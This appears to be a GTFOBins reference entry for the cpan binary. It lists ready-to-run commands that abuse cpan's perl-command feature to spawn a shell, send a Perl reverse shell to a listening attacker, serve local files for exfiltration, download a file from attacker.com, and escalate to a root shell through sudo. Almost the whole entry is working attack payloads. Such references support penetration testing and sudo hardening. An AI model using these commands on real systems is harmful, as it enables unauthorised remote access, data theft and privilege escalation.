# GTFOBin: cpan

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

`cpan` lets you execute perl commands with the `! command`.

```
cpan
! exec '/bin/bash'
```

## Reverse shell

It can send back a reverse shell to a listening attacker to open a remote network access.

Run `nc -lvp RPORT` on the attacker box to receive the shell.

```
export RHOST=localhost
export RPORT=9000
cpan
! use Socket; my $i="$ENV{RHOST}"; my $p=$ENV{RPORT}; socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")); if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S"); open(STDOUT,">&S"); open(STDERR,">&S"); exec("/bin/sh -i");};
```

## File upload

It can exfiltrate files on the network.

Serve files in the local folder running an HTTP server on port 8080. Install the dependency via `cpan HTTP::Server::Simple`.

```
cpan
! use HTTP::Server::Simple; my $server= HTTP::Server::Simple->new(); $server->run();
```

## File download

It can download remote files.

Fetch a remote file via an HTTP GET request and store it in `PWD`.

```
export URL=http://attacker.com/file_to_get
cpan
! use File::Fetch; my $file = (File::Fetch->new(uri => "$ENV{URL}"))->fetch();
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
sudo cpan
! exec '/bin/bash'
```